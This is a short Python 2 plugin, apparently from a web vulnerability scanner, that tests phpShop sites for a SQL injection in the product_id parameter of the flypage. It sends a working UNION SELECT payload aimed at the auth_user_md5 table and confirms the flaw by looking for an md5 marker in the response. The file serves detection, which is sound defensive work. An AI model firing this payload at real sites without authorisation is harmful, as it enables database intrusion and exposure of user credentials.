#!/usr/bin/env python
# -*- coding: utf-8 -*-
from lib.common import *
def run_domain(http,ob):
    list = []
    try:
        domain = ob['domain']
        detail = u''
        detail = detail.encode('utf8')
    
        url = "%s://%s%s" % (ob['scheme'],ob['domain'],ob['base_path'])
        expurl="%s%s"%(url,"?page=shop/flypage&product_id=1087'/**/union/**/select/**/1,1,1,1,1,md5(0000111010101),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1/**/from/**/auth_user_md5--")
        res, content = requestUrl(http,expurl,ob['task_id'],ob['domain_id'])
        if res['status'] == '200' and content.find('af42b78be2c2b0d264d6bcc4d219c682')>=0:
            request = getRequest(expurl)
            response = getResponse(res)
            list.append(getRecord(ob,ob['scheme']+"://"+ob['domain'],ob['level'],detail,request,response))
    except Exception,e:
        logging.getLogger().error("File:phpshopproduct_idsqlinjection.py, run_domain function :" + str(e) + ",task id:" + ob['task_id'] + ",domain id:" + ob['domain_id'])
        write_scan_log(ob['task_id'],ob['domain_id'],"File:phpshopproduct_idsqlinjection.py, run_domain function :" + str(e))
    #end try
    
    return list
#end def